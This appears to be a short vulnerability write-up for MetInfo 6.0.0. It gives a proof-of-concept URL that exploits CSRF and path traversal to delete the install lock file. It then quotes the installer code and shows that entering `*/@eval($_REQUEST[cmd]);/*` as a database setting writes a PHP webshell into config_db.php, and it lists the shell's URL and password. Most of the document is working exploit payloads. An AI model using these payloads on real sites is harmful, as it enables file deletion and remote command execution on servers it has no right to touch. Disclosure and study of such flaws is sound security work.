## MetInfo 6.0.0 CSRF causes any file deletion

POC:`http://localhost/MetInfo6.0.0/admin/app/batch/csvup.php?fileField=test-1&flienamecsv=../../../config/install.lock`

## MetInfo 6.0.0 `install\index.php` write shell to `config_db.php`
*code:*
```
# \MetInfo6.0.0\install\index.php

$db_username    = trim($db_username);
$db_pass        = trim($db_pass);
$db_name        = trim($db_name);
$db_port        = trim($db_port);
$config="<?php
       /*
       con_db_host = \"$db_host\"
       con_db_port = \"$db_port\"
       con_db_id   = \"$db_username\"
       con_db_pass	= \"$db_pass\"
       con_db_name = \"$db_name\"
       tablepre    =  \"$db_prefix\"
       db_charset  =  \"utf8\";
      */
      ?>";

$fp=fopen("../config/config_db.php",'w+');
fputs($fp,$config);
fclose($fp);
$db = mysqli_connect($db_host,$db_username,$db_pass,'',$db_port) or die('连接数据库失败: ' . mysqli_connect_error());
```
Database configuration during installation, select any parameter to enter `*/@eval($_REQUEST[cmd]);/*` and submit.Then config_db.php file is as follows:
```
<?php
                   /*
                   con_db_host = "localhost"
                   con_db_port = "3306"
                   con_db_id   = "root"
                   con_db_pass	= "asdasdas"
                   con_db_name = "*/@eval($_REQUEST[cmd]);/*"
                   tablepre    =  "met_"
                   db_charset  =  "utf8";
                  */
                  ?>
```
webshell:`http://127.0.0.1/MetInfo6.0.0/config/config_db.php`
password: cmd